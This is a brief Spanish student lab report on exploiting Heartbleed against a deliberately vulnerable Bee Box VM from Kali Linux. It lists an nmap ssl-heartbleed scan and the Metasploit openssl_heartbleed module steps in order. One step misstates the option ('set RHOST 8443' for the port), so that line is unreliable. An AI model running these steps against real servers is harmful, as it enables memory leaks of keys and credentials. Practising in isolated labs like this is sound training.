se me dificulpo poco por la redacción e investigue despues de que entregue la tarea mal y la volvi a hacer
1.- Configure las dos maquinas en RED NAT para poder tener ip's unicas y poder
atacarla 

2.- en Bee Box seleccione el modo "Hearthbleed Vulnerability" y le presione "hack" eso me señalo el puerto a utilizar para atacar mas adelante

3.- en mi maquina kali linux use el siguiente comando
nmap -p 8443 --script ssl-heartbleed 10.0.2.4

4.- abri (msfconsole)

5.- use lo siguiente "auxiliary/scanner/ssl/openssl_heartbleed

6.- defini el el host que atacaria "set RHOST 10.0.2.4"

7.- ahora el puerto "set RHOST 8443"

8.- se definir lo siguiente "set verbose true"

9.- y por ultimo corremos el exploit con "exploit"

timedatectl
uname -a

se guardo los resultados en un txt

